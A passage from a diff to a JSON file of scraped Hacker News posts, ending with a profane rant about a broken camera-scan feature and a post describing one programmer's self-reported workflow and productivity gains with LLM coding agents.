HEIGHT YOU MOTHERFUCKER!!!\nin firefox we get: camera scan is not available in this browser! THIS IS NOT ACCEPTABLE!! THIS HAS TO WORK!! FOR FUCK SAKE YOU ARE A LAZY BASTARD!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "fired"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49104392",
+      "title": "How to get more coding productivity with LLMs",
+      "link": "https://news.ycombinator.com/item?id=49104392",
+      "domain": "news.ycombinator.com",
+      "author": "DaveParkCity",
+      "score": 3,
+      "comment_count": 0,
+      "created_ts": 1785367690,
+      "is_internal": true,
+      "post_text": "As someone who is a lifelong programmer and entrepreneur, I&#x27;m here to say that 2-4-8x AI productivity boost is just the start. I&#x27;m currently benchmarking myself at 40-50x coding producivity with AI over 16 weeks, compared to pre-AI, and it&#x27;s increasing over time, and I am trying to find ways to share these techniques with more programmers. Here we go HN...<p>I measure in lines of code, which I know is an imperfect metric, but it&#x27;s the quantative metric I have, and I&#x27;m qualified to know it&#x27;s limits and say, this is real. I wrote and sold software in high school. I sold a company to Google when I was 27 for which I wrote half the code (Neotonic [1]). In that startup I wrote up to 60k LOC per year of Python, C, and html templates. With AI I&#x27;m producing that much in a week on average... over 16 weeks running. I mostly retired at 33, and here I am 52 and coding all day every day.<p>I use AI models a little differently than most I know. I wield them like a word-calculator, I don&#x27;t defer to them as if they are smart. (they are not. they are conservatively 100x worse at software design tradeoffs than a senior architect, but they are knowledgeable and they work very fast. They are &quot;the intern&quot; you always wished for)<p>I get there by doing at least these three key things differently:<p>1. <i>I turn off thinking while coding.</i> I frontload the design-time thinking and elaboration, into a design-spec and an implementation-spec, so by the time an agent is coding, I&#x27;ve resolved all the ambiguity myself. So I turn off thinking (or set it as low as I can), so the AI will stop revisiting things I already resolved. THis is especially important because my codebase is now over 350k LOC of interconnected layered abstrction, not a one-shot mobile app.<p>2. <i>I stay connected and read most of the verbal chat output</i> and I stop the AI when it says <i>anything</i> that is wrong or incongruent with the design I have in my head. Becuase that&#x27;s a sign that the LLM context is unaligned, that it misundertood something.<p>3. <i>I design the coding prioritization to get from A to B</i>... the ordering of the feature development, just like I would do myself, to minimize architecture risk, get the unknowns out of the way, feel the thing taking shape before the complexity layers in..Then build harnesses with as much AI visible iteration loop as is practical for the part we are working on. I use third-party oracle references when I can (like pixel correct font and shape tests against Skia, instead of just eyeballing) And I decide the level of detail where this is useful, then put the LLM in a place where it can succeed.<p>In short, it&#x27;s still me, building my software, my way. I&#x27;m trying my best to get the AIs to mirror the way I would do it, at every stage, because I find that process more productive. I&#x27;ve tried more hands-off eyes-off alternatives, and I would get rapid jumps and then spend entire days untangling some AI slop mess, and the codebases would just get so tangled around 60k LOC they became a morass, twice.<p>LLMs can code one-shot a mobile app. They can implement an algorithm mostly-correct from a research paper, and they can sometimes make semi-pretty UI. But they can&#x27;t (as of yet) intuit the right tradeoffs to meet your needs. They can&#x27;t decide what software to build, why you should build it, what parts of the software to build for flexibility in the future vs practicality now. What algorithms will be the best fit for the real world needs, none of it.<p>And what they do in those areas is worse than not-knowing. They confidently expound garbage. Absolute drivel. And so the most valuable skill you can have for being hyper productive with AI coding, is to beable to read fast enough to stay on top of it, and recognize the difference between the excellent execution and the drivel.<p>[1] https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Neotonic_Software",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "startup",
+        "senior"
+      ],
+      "comments": []
+    }
+  ]
+}
